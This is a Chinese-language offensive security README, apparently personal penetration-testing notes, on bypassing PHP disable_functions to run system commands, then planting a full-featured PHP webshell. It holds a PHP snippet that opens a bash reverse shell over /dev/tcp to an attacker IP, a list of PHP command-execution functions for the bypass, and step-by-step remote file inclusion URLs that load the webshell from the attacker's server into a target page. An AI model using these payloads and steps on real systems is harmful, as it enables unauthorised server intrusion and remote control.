# 使用方法
1. 先通过获取 phpinfo 信息，确定哪些函数是被 disable_funtion 禁止
2. 对比`PHP中可执行系统命令的函数`，找到一个可以用于**执行系统命令**的函数
3. 通过下面的简单测试，**先确认**该函数确实可以执行：
```
<?php
echo "php function test.";
# shell_exce 修改成测试函数
$output = shell_exec('ls -lart');
echo "<pre>$output</pre>";
?>

```
4. 确认执行 shell 的函数后，可结合`nc`、`bash`、`php`等方式反弹 shell，详见[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)。
例如，我之前遇到使用 nc 不能反弹回 shell，于是尝试了直接使用 bash 反弹 shell 就成功了：
```
<?php
echo "php function test";
$output = shell_exec("bash -i >& /dev/tcp/192.168.119.189/443 0>&1");
echo "<pre>$output</pre>";
?>
```

# PHP中可执行系统命令的函数

- exec — 执行一个外部程序
- passthru — 执行外部程序并且显示原始输出
- shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
- system — 执行外部程序，并且显示输出
- [popen](https://www.php.net/manual/zh/function.popen.php) - 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
- proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。
`popen`和`proc_open`现在其他 php-shell 中普遍用的较少，可以重点留意一下

# PHP 大马
何为大马？

大马就是具有较多功能的PHP-webshell（相较于一句话木马），以前我们在拿站的时候，通常在反弹 shell 之前会先上传一个大马，然后利用大马的信息收集、命令执行、文件浏览/上传/编辑等功能，从而反弹一个 shell 回来。（当然，如果能直接反弹 shell 回来，就不用上传大马了）。

但是后来有了菜刀、蚁剑等强大的工具，很多时候只需要一句话木马搭配蚁剑就替代了大马的功能，所以大马就用的少了。

所以我总结了一个大致的利用思路（不用蚁剑的情况下）：`PHP大马`> `反弹shell`>`PE(提权)`

## big-shell.php
Usage
RFI:
- 1. `http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt`，then input the passwd `pass`
- 2. 这时候因为是 RFI 包含的此大马，所以页面会自动重载为section.php，需要手动再次进入：`http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt`，然后就可以看到大马的页面
- 3. 进入fbrowser 需要手动输入：`http://10.11.1.35/section.php?page=http://192.168.119.189:8000/test.txt&act=fbrowser`
